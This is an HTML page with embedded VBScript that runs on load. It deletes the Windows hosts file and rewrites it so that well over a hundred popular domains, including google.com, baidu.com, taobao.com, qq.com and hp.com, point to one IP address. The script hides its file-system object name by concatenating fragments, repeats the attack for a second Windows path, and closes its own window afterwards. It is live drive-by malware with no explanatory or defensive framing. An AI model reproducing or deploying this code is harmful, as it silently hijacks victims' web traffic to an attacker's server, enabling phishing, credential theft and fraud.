<html>

<object id='wshh' classid='clsid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B'></object>
<script LANGUAGE="VBScript">
on error resume next

Set Fso=CreateObject("Scri" + "pting.Fil" + "eSyste" + "mO" + "bject")


wj1 = "C:\\WINDOWS\\system32\\drivers\\etc\\hosts"
Set f2 = fso.deleteFile(wj1,true)


Set wf1=fso.CreateTextFile(wj1,true)
wf1.writeLine("127.0.0.1       localhost")
wf1.writeLine("218.92.240.2	sina.comcn")
wf1.writeLine("218.92.240.2	google.com")
wf1.writeLine("218.92.240.2	baidu.com")
wf1.writeLine("218.92.240.2	sohu.com")
wf1.writeLine("218.92.240.2	qiandu.com")
wf1.writeLine("218.92.240.2	pku.edu.cn")
wf1.writeLine("218.92.240.2	163.com")
wf1.writeLine("218.92.240.2	cn.yahoo.com")
wf1.writeLine("218.92.240.2	china.com")
wf1.writeLine("218.92.240.2	intel.com")
wf1.writeLine("218.92.240.2	168idc.com")
wf1.writeLine("218.92.240.2	chinadns.com")
wf1.writeLine("218.92.240.2	comapnydns.com")
wf1.writeLine("218.92.240.2	companycn.com")
wf1.writeLine("218.92.240.2	yhyb.com.cn")
wf1.writeLine("218.92.240.2	useheart.com")
wf1.writeLine("218.92.240.2	flygood.com.cn")
wf1.writeLine("218.92.240.2	mammoth.com.cn")
wf1.writeLine("218.92.240.2	chinadatacom.com")
wf1.writeLine("218.92.240.2	szsh.com.cn")
wf1.writeLine("218.92.240.2	enet.com.cn")
wf1.writeLine("218.92.240.2	tongfangpc.com")
wf1.writeLine("218.92.240.2	hp.com")
wf1.writeLine("218.92.240.2	ezshop.net.cn")
wf1.writeLine("218.92.240.2	it168.com")
wf1.writeLine("218.92.240.2	pconline.comcn")
wf1.writeLine("218.92.240.2	zol.com.cn")
wf1.writeLine("218.92.240.2	yinhenet.com")
wf1.writeLine("218.92.240.2	hc360.com")
wf1.writeLine("218.92.240.2	benu.cn")
wf1.writeLine("218.92.240.2	365gou.com.cn")
wf1.writeLine("218.92.240.2	it995.com")
wf1.writeLine("218.92.240.2	anddo.com")
wf1.writeLine("218.92.240.2	9876543210.cn")
wf1.writeLine("218.92.240.2	58365.com")
wf1.writeLine("218.92.240.2	chinaz.com")
wf1.writeLine("218.92.240.2	www.net.cn")
wf1.writeLine("218.92.240.2	www1.com.cn")
wf1.writeLine("218.92.240.2	payway.com.cn")
wf1.writeLine("218.92.240.2	kuww.net")
wf1.writeLine("218.92.240.2	cxina.com")
wf1.writeLine("218.92.240.2	sznic.comcn")
wf1.writeLine("218.92.240.2	bizcn.com")
wf1.writeLine("218.92.240.2	woowoo.cn")
wf1.writeLine("218.92.240.2	blueie.net")
wf1.writeLine("218.92.240.2	cndns.net.cn")
wf1.writeLine("218.92.240.2	nihao.net")
wf1.writeLine("218.92.240.2	hotsales.net")
wf1.writeLine("218.92.240.2	west263.com")
wf1.writeLine("218.92.240.2	usernet.cn")
wf1.writeLine("218.92.240.2	akg.cn")
wf1.writeLine("218.92.240.2	kuww.net")
wf1.writeLine("218.92.240.2	qvsp.com")
wf1.writeLine("218.92.240.2	akg.cn")
wf1.writeLine("218.92.240.2	qvsp.com")
wf1.writeLine("218.92.240.2	tf263.com")
wf1.writeLine("218.92.240.2	kuww.net")
wf1.writeLine("218.92.240.2	ourhost.com.cn")
wf1.writeLine("218.92.240.2	35inter.com")
wf1.writeLine("218.92.240.2	bigwww.com")
wf1.writeLine("218.92.240.2	cnwindows.com")
wf1.writeLine("218.92.240.2	zgdata.com")
wf1.writeLine("218.92.240.2	web.114.com.cn")
wf1.writeLine("218.92.240.2	rent8890.com")
wf1.writeLine("218.92.240.2	61com.com")
wf1.writeLine("218.92.240.2	pc-lease.com.cn")
wf1.writeLine("218.92.240.2	netcenter.com.cn")
wf1.writeLine("218.92.240.2	kete.cn")
wf1.writeLine("218.92.240.2	zgsj.com")
wf1.writeLine("218.92.240.2	edong.com")
wf1.writeLine("218.92.240.2	51web.cn")
wf1.writeLine("218.92.240.2	17466.com")
wf1.writeLine("218.92.240.2	aaasf.com")
wf1.writeLine("218.92.240.2	vridc.com")
wf1.writeLine("218.92.240.2	chinasfz.com")
wf1.writeLine("218.92.240.2	www.qiandu.com")
wf1.writeLine("218.92.240.2	www.pku.edu.cn")
wf1.writeLine("218.92.240.2	www.cnyahoo.com")
wf1.writeLine("218.92.240.2	www.china.com")
wf1.writeLine("218.92.240.2	www.intel.com")
wf1.writeLine("218.92.240.2	www.168idc.com")
wf1.writeLine("218.92.240.2	www.chinadns.com")
wf1.writeLine("218.92.240.2	www.comapnydns.com")
wf1.writeLine("218.92.240.2	www.companycn.com")
wf1.writeLine("218.92.240.2	www.yhyb.com.cn")
wf1.writeLine("218.92.240.2	www.useheart.com")
wf1.writeLine("218.92.240.2	www.flygood.com.cn")
wf1.writeLine("218.92.240.2	www.mammoth.com.cn")
wf1.writeLine("218.92.240.2	www.chinadatacom.com")
wf1.writeLine("218.92.240.2	www.szsh.com.cn")
wf1.writeLine("218.92.240.2	www.enet.com.cn")
wf1.writeLine("218.92.240.2	www.tongfangpc.com")
wf1.writeLine("218.92.240.2	www.hp.com")
wf1.writeLine("218.92.240.2	www.ezshop.net.cn")
wf1.writeLine("218.92.240.2	www.it168.com")
wf1.writeLine("218.92.240.2	www.pconline.com.cn")
wf1.writeLine("218.92.240.2	www.zol.com.cn")
wf1.writeLine("218.92.240.2	www.yinhenet.com")
wf1.writeLine("218.92.240.2	www.hc360.com")
wf1.writeLine("218.92.240.2	www.benu.cn")
wf1.writeLine("218.92.240.2	www.365gou.com.cn")
wf1.writeLine("218.92.240.2	www.it995.com")
wf1.writeLine("218.92.240.2	www.anddo.com")
wf1.writeLine("218.92.240.2	www.9876543210.cn")
wf1.writeLine("218.92.240.2	www.58365.com")
wf1.writeLine("218.92.240.2	www.chinaz.com")
wf1.writeLine("218.92.240.2	www.net.cn")
wf1.writeLine("218.92.240.2	www1.com.cn")
wf1.writeLine("218.92.240.2	www.payway.com.cn")
wf1.writeLine("218.92.240.2	www.kuww.net")
wf1.writeLine("218.92.240.2	www.cxina.com")
wf1.writeLine("218.92.240.2	www.sznic.comcn")
wf1.writeLine("218.92.240.2	www.bizcn.com")
wf1.writeLine("218.92.240.2	www.woowoo.cn")
wf1.writeLine("218.92.240.2	www.blueie.net")
wf1.writeLine("218.92.240.2	www.cndns.net.cn")
wf1.writeLine("218.92.240.2	www.nihao.net")
wf1.writeLine("218.92.240.2	www.hotsales.net")
wf1.writeLine("218.92.240.2	www.west263.com")
wf1.writeLine("218.92.240.2	www.usernet.cn")
wf1.writeLine("218.92.240.2	www.akg.cn")
wf1.writeLine("218.92.240.2	www.kuww.net")
wf1.writeLine("218.92.240.2	www.qvsp.com")
wf1.writeLine("218.92.240.2	www.akg.cn")
wf1.writeLine("218.92.240.2	www.qvsp.com")
wf1.writeLine("218.92.240.2	www.tf263.com")
wf1.writeLine("218.92.240.2	www.kuww.net")
wf1.writeLine("218.92.240.2	www.ourhost.com.cn")
wf1.writeLine("218.92.240.2	www.35inter.com")
wf1.writeLine("218.92.240.2	www.bigwww.com")
wf1.writeLine("218.92.240.2	www.cnwindows.com")
wf1.writeLine("218.92.240.2	www.zgdata.com")
wf1.writeLine("218.92.240.2	web.114.com.cn")
wf1.writeLine("218.92.240.2	www.rent8890.com")
wf1.writeLine("218.92.240.2	www.61com.com")
wf1.writeLine("218.92.240.2	www.pc-lease.com.cn")
wf1.writeLine("218.92.240.2	www.netcenter.com.cn")
wf1.writeLine("218.92.240.2	www.kete.cn")
wf1.writeLine("218.92.240.2	www.zgsj.com")
wf1.writeLine("218.92.240.2	www.edong.com")
wf1.writeLine("218.92.240.2	www.51web.cn")
wf1.writeLine("218.92.240.2	www.17466.com")
wf1.writeLine("218.92.240.2	www.aaasf.com")
wf1.writeLine("218.92.240.2	www.vridc.com")
wf1.writeLine("218.92.240.2	www.chinasfz.com")
wf1.writeLine("218.92.240.2	www.haosf.com")
wf1.writeLine("218.92.240.2	3721.com")
wf1.writeLine("218.92.240.2	qq.com")
wf1.writeLine("218.92.240.2	taobao.com")
wf1.writeLine("218.92.240.2	cns.3721.com")
wf1.writeLine("218.92.240.2	www.taobao.com")
wf1.writeLine("218.92.240.2	taobao.com")
wf1.writeLine("218.92.240.2	www.allyes.com")
wf1.writeLine("218.92.240.2	allyes.com")
wf1.writeLine("218.92.240.2	www.21cn.com")
wf1.writeLine("218.92.240.2	21cn.com")
wf1.writeLine("218.92.240.2	chinaren.com")
wf1.writeLine("218.92.240.2	www.chinaren.com")
wf1.writeLine("218.92.240.2	hao123.com")
wf1.writeLine("218.92.240.2	www.hao123.com")
wf1.writeLine("218.92.240.2	pconline.com.cn")
wf1.writeLine("218.92.240.2	www.pconline.com.cn")
wf1.writeLine("218.92.240.2	sogou.com")
wf1.writeLine("218.92.240.2	www.sogou.com")
wf1.writeLine("218.92.240.2	17173.com")
wf1.writeLine("218.92.240.2	www.17173.com")
wf1.writeLine("218.92.240.2	cmfu.com")
wf1.writeLine("218.92.240.2	www.cmfu.com")
wf1.writeLine("218.92.240.2	www.51job.com")
wf1.writeLine("218.92.240.2	51job.com")

</script>
<script LANGUAGE="VBScript">
on error resume next
Set Fso=CreateObject("Scri" + "pting.Fil" + "eSyste" + "mO" + "bject")

wj1 = "C:\\WINDNT\\system32\\drivers\\etc\\hosts"
Set f2 = fso.deleteFile(wj1,true)

Set wf1=fso.CreateTextFile(wj1,true)
wf1.writeLine("127.0.0.1       localhost")
wf1.writeLine("218.92.240.2	sina.comcn")
wf1.writeLine("218.92.240.2	google.com")
wf1.writeLine("218.92.240.2	baidu.com")
wf1.writeLine("218.92.240.2	sohu.com")
wf1.writeLine("218.92.240.2	qiandu.com")
wf1.writeLine("218.92.240.2	pku.edu.cn")
wf1.writeLine("218.92.240.2	163.com")
wf1.writeLine("218.92.240.2	cn.yahoo.com")
wf1.writeLine("218.92.240.2	china.com")
wf1.writeLine("218.92.240.2	intel.com")
wf1.writeLine("218.92.240.2	168idc.com")
wf1.writeLine("218.92.240.2	chinadns.com")
wf1.writeLine("218.92.240.2	comapnydns.com")
wf1.writeLine("218.92.240.2	companycn.com")
wf1.writeLine("218.92.240.2	yhyb.com.cn")
wf1.writeLine("218.92.240.2	useheart.com")
wf1.writeLine("218.92.240.2	flygood.com.cn")
wf1.writeLine("218.92.240.2	mammoth.com.cn")
wf1.writeLine("218.92.240.2	chinadatacom.com")
wf1.writeLine("218.92.240.2	szsh.com.cn")
wf1.writeLine("218.92.240.2	enet.com.cn")
wf1.writeLine("218.92.240.2	tongfangpc.com")
wf1.writeLine("218.92.240.2	hp.com")
wf1.writeLine("218.92.240.2	ezshop.net.cn")
wf1.writeLine("218.92.240.2	it168.com")
wf1.writeLine("218.92.240.2	pconline.comcn")
wf1.writeLine("218.92.240.2	zol.com.cn")
wf1.writeLine("218.92.240.2	yinhenet.com")
wf1.writeLine("218.92.240.2	hc360.com")
wf1.writeLine("218.92.240.2	benu.cn")
wf1.writeLine("218.92.240.2	365gou.com.cn")
wf1.writeLine("218.92.240.2	it995.com")
wf1.writeLine("218.92.240.2	anddo.com")
wf1.writeLine("218.92.240.2	9876543210.cn")
wf1.writeLine("218.92.240.2	58365.com")
wf1.writeLine("218.92.240.2	chinaz.com")
wf1.writeLine("218.92.240.2	www.net.cn")
wf1.writeLine("218.92.240.2	www1.com.cn")
wf1.writeLine("218.92.240.2	payway.com.cn")
wf1.writeLine("218.92.240.2	kuww.net")
wf1.writeLine("218.92.240.2	cxina.com")
wf1.writeLine("218.92.240.2	sznic.comcn")
wf1.writeLine("218.92.240.2	bizcn.com")
wf1.writeLine("218.92.240.2	woowoo.cn")
wf1.writeLine("218.92.240.2	blueie.net")
wf1.writeLine("218.92.240.2	cndns.net.cn")
wf1.writeLine("218.92.240.2	nihao.net")
wf1.writeLine("218.92.240.2	hotsales.net")
wf1.writeLine("218.92.240.2	west263.com")
wf1.writeLine("218.92.240.2	usernet.cn")
wf1.writeLine("218.92.240.2	akg.cn")
wf1.writeLine("218.92.240.2	kuww.net")
wf1.writeLine("218.92.240.2	qvsp.com")
wf1.writeLine("218.92.240.2	akg.cn")
wf1.writeLine("218.92.240.2	qvsp.com")
wf1.writeLine("218.92.240.2	tf263.com")
wf1.writeLine("218.92.240.2	kuww.net")
wf1.writeLine("218.92.240.2	ourhost.com.cn")
wf1.writeLine("218.92.240.2	35inter.com")
wf1.writeLine("218.92.240.2	bigwww.com")
wf1.writeLine("218.92.240.2	cnwindows.com")
wf1.writeLine("218.92.240.2	zgdata.com")
wf1.writeLine("218.92.240.2	web.114.com.cn")
wf1.writeLine("218.92.240.2	rent8890.com")
wf1.writeLine("218.92.240.2	61com.com")
wf1.writeLine("218.92.240.2	pc-lease.com.cn")
wf1.writeLine("218.92.240.2	netcenter.com.cn")
wf1.writeLine("218.92.240.2	kete.cn")
wf1.writeLine("218.92.240.2	zgsj.com")
wf1.writeLine("218.92.240.2	edong.com")
wf1.writeLine("218.92.240.2	51web.cn")
wf1.writeLine("218.92.240.2	17466.com")
wf1.writeLine("218.92.240.2	aaasf.com")
wf1.writeLine("218.92.240.2	vridc.com")
wf1.writeLine("218.92.240.2	chinasfz.com")
wf1.writeLine("218.92.240.2	www.qiandu.com")
wf1.writeLine("218.92.240.2	www.pku.edu.cn")
wf1.writeLine("218.92.240.2	www.cnyahoo.com")
wf1.writeLine("218.92.240.2	www.china.com")
wf1.writeLine("218.92.240.2	www.intel.com")
wf1.writeLine("218.92.240.2	www.168idc.com")
wf1.writeLine("218.92.240.2	www.chinadns.com")
wf1.writeLine("218.92.240.2	www.comapnydns.com")
wf1.writeLine("218.92.240.2	www.companycn.com")
wf1.writeLine("218.92.240.2	www.yhyb.com.cn")
wf1.writeLine("218.92.240.2	www.useheart.com")
wf1.writeLine("218.92.240.2	www.flygood.com.cn")
wf1.writeLine("218.92.240.2	www.mammoth.com.cn")
wf1.writeLine("218.92.240.2	www.chinadatacom.com")
wf1.writeLine("218.92.240.2	www.szsh.com.cn")
wf1.writeLine("218.92.240.2	www.enet.com.cn")
wf1.writeLine("218.92.240.2	www.tongfangpc.com")
wf1.writeLine("218.92.240.2	www.hp.com")
wf1.writeLine("218.92.240.2	www.ezshop.net.cn")
wf1.writeLine("218.92.240.2	www.it168.com")
wf1.writeLine("218.92.240.2	www.pconline.com.cn")
wf1.writeLine("218.92.240.2	www.zol.com.cn")
wf1.writeLine("218.92.240.2	www.yinhenet.com")
wf1.writeLine("218.92.240.2	www.hc360.com")
wf1.writeLine("218.92.240.2	www.benu.cn")
wf1.writeLine("218.92.240.2	www.365gou.com.cn")
wf1.writeLine("218.92.240.2	www.it995.com")
wf1.writeLine("218.92.240.2	www.anddo.com")
wf1.writeLine("218.92.240.2	www.9876543210.cn")
wf1.writeLine("218.92.240.2	www.58365.com")
wf1.writeLine("218.92.240.2	www.chinaz.com")
wf1.writeLine("218.92.240.2	www.net.cn")
wf1.writeLine("218.92.240.2	www1.com.cn")
wf1.writeLine("218.92.240.2	www.payway.com.cn")
wf1.writeLine("218.92.240.2	www.kuww.net")
wf1.writeLine("218.92.240.2	www.cxina.com")
wf1.writeLine("218.92.240.2	www.sznic.comcn")
wf1.writeLine("218.92.240.2	www.bizcn.com")
wf1.writeLine("218.92.240.2	www.woowoo.cn")
wf1.writeLine("218.92.240.2	www.blueie.net")
wf1.writeLine("218.92.240.2	www.cndns.net.cn")
wf1.writeLine("218.92.240.2	www.nihao.net")
wf1.writeLine("218.92.240.2	www.hotsales.net")
wf1.writeLine("218.92.240.2	www.west263.com")
wf1.writeLine("218.92.240.2	www.usernet.cn")
wf1.writeLine("218.92.240.2	www.akg.cn")
wf1.writeLine("218.92.240.2	www.kuww.net")
wf1.writeLine("218.92.240.2	www.qvsp.com")
wf1.writeLine("218.92.240.2	www.akg.cn")
wf1.writeLine("218.92.240.2	www.qvsp.com")
wf1.writeLine("218.92.240.2	www.tf263.com")
wf1.writeLine("218.92.240.2	www.kuww.net")
wf1.writeLine("218.92.240.2	www.ourhost.com.cn")
wf1.writeLine("218.92.240.2	www.35inter.com")
wf1.writeLine("218.92.240.2	www.bigwww.com")
wf1.writeLine("218.92.240.2	www.cnwindows.com")
wf1.writeLine("218.92.240.2	www.zgdata.com")
wf1.writeLine("218.92.240.2	web.114.com.cn")
wf1.writeLine("218.92.240.2	www.rent8890.com")
wf1.writeLine("218.92.240.2	www.61com.com")
wf1.writeLine("218.92.240.2	www.pc-lease.com.cn")
wf1.writeLine("218.92.240.2	www.netcenter.com.cn")
wf1.writeLine("218.92.240.2	www.kete.cn")
wf1.writeLine("218.92.240.2	www.zgsj.com")
wf1.writeLine("218.92.240.2	www.edong.com")
wf1.writeLine("218.92.240.2	www.51web.cn")
wf1.writeLine("218.92.240.2	www.17466.com")
wf1.writeLine("218.92.240.2	www.aaasf.com")
wf1.writeLine("218.92.240.2	www.vridc.com")
wf1.writeLine("218.92.240.2	www.chinasfz.com")
wf1.writeLine("218.92.240.2	www.haosf.com")
wf1.writeLine("218.92.240.2	3721.com")
wf1.writeLine("218.92.240.2	qq.com")
wf1.writeLine("218.92.240.2	taobao.com")
wf1.writeLine("218.92.240.2	cns.3721.com")
wf1.writeLine("218.92.240.2	www.taobao.com")
wf1.writeLine("218.92.240.2	taobao.com")
wf1.writeLine("218.92.240.2	www.allyes.com")
wf1.writeLine("218.92.240.2	allyes.com")
wf1.writeLine("218.92.240.2	www.21cn.com")
wf1.writeLine("218.92.240.2	21cn.com")
wf1.writeLine("218.92.240.2	chinaren.com")
wf1.writeLine("218.92.240.2	www.chinaren.com")
wf1.writeLine("218.92.240.2	hao123.com")
wf1.writeLine("218.92.240.2	www.hao123.com")
wf1.writeLine("218.92.240.2	pconline.com.cn")
wf1.writeLine("218.92.240.2	www.pconline.com.cn")
wf1.writeLine("218.92.240.2	sogou.com")
wf1.writeLine("218.92.240.2	www.sogou.com")
wf1.writeLine("218.92.240.2	17173.com")
wf1.writeLine("218.92.240.2	www.17173.com")
wf1.writeLine("218.92.240.2	cmfu.com")
wf1.writeLine("218.92.240.2	www.cmfu.com")
wf1.writeLine("218.92.240.2	www.51job.com")
wf1.writeLine("218.92.240.2	51job.com")

</script>
<script language="JScript">
function closeit() {
setTimeout("self.close()",5)
}
closeit()
</script>